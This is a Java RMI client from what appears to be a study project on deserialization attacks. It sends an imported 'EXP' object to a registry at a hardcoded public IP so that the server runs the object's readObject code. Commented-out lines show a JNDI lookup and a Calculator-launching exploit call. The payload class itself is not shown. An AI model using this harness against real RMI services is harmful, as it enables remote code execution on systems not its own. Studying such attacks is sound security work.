package com.sorry.jcoffe.Debug.RMI;

import com.sorry.jcoffe.Debug.Serialization.EXP;

import java.io.*;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient{
    public static void main(String[] args) throws IOException, NotBoundException{
        System.out.println("RMIClient ready!");
        Registry registry = LocateRegistry.getRegistry("39.108.244.167",1099);
        // RMI远程调用自动反序列化函数传的参数的readObject()
        // Client端将其序列化出发writeObject
        // Server端将其反序列化从而出发readObject
        ObjectInterface objectInterface = (ObjectInterface) registry.lookup("exp");
        EXP exp = new EXP();
        System.out.println(objectInterface.Function(exp));//序列化参数继承自remote的类函数的*参数*,在这里为exp对象


        //rmi of jndi
        /*
        new InitialContext().lookup("rmi://39.108.244.167:1099/exp");
        */

        //Naming快捷方法
        /*
        EXP exp = (EXP) Naming.lookup("rmi://:1099/exp");
        exp.Exploit("open /System/Applications/Calculator.app");
        System.out.println(exp);
        */
    }
}
